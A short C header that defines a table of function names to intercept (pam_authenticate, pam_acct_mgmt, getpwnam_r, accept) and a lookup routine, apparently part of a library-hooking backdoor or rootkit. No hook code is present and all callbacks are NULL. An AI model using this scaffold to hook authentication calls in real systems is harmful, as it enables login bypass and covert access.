#ifndef H0H0_LIBCALLS_H
#define H0H0_LIBCALLS_H

typedef int (*libcall)();

/* Libcall hash. */
struct lc_hash
{
    const char *name;
    libcall callback;
};

/* Libcall table. */
struct lc_hash libcalls[] = \
{
    {"pam_authenticate", NULL},
    {"pam_acct_mgmt", NULL},
    {"getpwnam_r", NULL},
    {"accept", NULL}
};
size_t num_libcalls = sizeof(libcalls) / sizeof(libcalls[0]);

/* Get libcall by name. */
libcall getlibcall(const char *name)
{
    for (int i = 0; i < num_libcalls; i++)
    {
        if (!strcmp(name, libcalls[i].name))
            return libcalls[i].callback;
    }

    // TODO: Add dummy func to avoid crashing on invalid name.
    return NULL;
}

#endif
